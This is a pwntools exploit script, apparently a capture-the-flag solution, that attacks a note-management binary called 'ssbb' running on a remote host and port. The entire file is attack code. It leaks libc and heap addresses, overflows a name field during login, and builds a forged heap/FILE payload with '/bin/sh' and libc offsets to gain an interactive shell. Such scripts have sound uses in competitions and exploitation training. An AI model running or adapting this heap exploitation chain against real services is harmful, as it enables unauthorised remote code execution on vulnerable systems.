from pwn import *

local=0
uselibc=2  #0 for no,1 for i386,2 for x64
haslibc=0
pc='./ssbb'
remote_addr="116.62.142.216"
remote_port=20002

if uselibc==2 and haslibc==0:
    libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else:
    if uselibc==1 and haslibc==0:
        libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
    else:
        if haslibc!=0:
            libc=ELF('./libc.so.6')

if local==1:
    if haslibc:
        p = process(pc,aslr=False,env={'LD_PRELOAD': './libc.so.6'})
    else:
        p=process(pc,aslr=False)
#    context.log_level=True
    gdb.attach(p,'c')
else:
    p=remote(remote_addr,remote_port)
    if haslibc!=0:
        libc=ELF('./libc.so.6')

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def raddr(a,l=None):
    if l==None:
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def choice(index):
    sla('exit\n',str(index))

def alloc(size,content):
    choice(1)
    sla('size\n',str(size))
    sla('note\n',content)

def free(idx):
    choice(2)
    sla('id:\n',str(idx))

def login(addr):
    choice(3)
    sla('name\n','A'*8+p64(addr)[0:7])
    sla('admin\n',str(1))

def hack():
    alloc(0x100,'AA')
    alloc(0x100,'AA')
    alloc(0x100,'AA')
    alloc(0x100,'AA')
    free(0)
    alloc(0x100,'')
    ru('note is\n')
    #libc_addr=raddr(6)-0x3c4b78
    libc_addr=raddr(6)-0x3c3b78
    #libc_addr=raddr(6)
    #libc_addr=raddr(6)-0x399b58
    libc.address=libc_addr
    lg("Libc",libc_addr)
    free(0)
    free(2)
    alloc(0x100,'A'*8)
    ru('A'*8)
    heap_addr=raddr(0,1)-0x0220
    lg("heap",heap_addr)
    free(3)
    free(1)
    free(0)

    alloc(0x1000,'AAAA')
    alloc(0x100,'BBB')
    alloc(0x1400,'bbb')
    alloc(0x100,'BBB')
    alloc(0x1700,'bb')
    alloc(0x1700,'bb')
    alloc(0x1700,'bb')
    alloc(0x1700,'A'*4848+p64(0x6e68)*2+p64(0x21)*5)
    free(1)
    login(heap_addr+0x1015-8)
    alloc(0x1200,'AA')
    alloc(0x500,'AA')
    free(8)
    free(3)
    payload=p64(0)+p64(0x61)+p64(heap_addr+0x2320)*2+p64(0)+p64(1)
    payload=payload.ljust(160,'\x00')
    payload+=p64(heap_addr+0x2310-0x30)+'/bin/sh\x00'
    payload=payload.ljust(216,'\x00')
    payload+=p64(libc_addr+0x3c2260-0x248)+p64(heap_addr+0x2230+168)+p64(libc_addr+0x45390)*2
    payload+=p64(0x201)+p64(0)+p64(libc_addr+0x3c4520-0x10)
    payload=payload.ljust(0x300,'\x00')
    payload=payload+p64(0)+p64(0x111)+p64(0xdeadbeef)+p64(heap_addr+0x2230)
    alloc(0x500,payload)
    alloc(0x200-8,'AA\n')
    free(3)
    print p.clean()
    p.interactive()

hack()
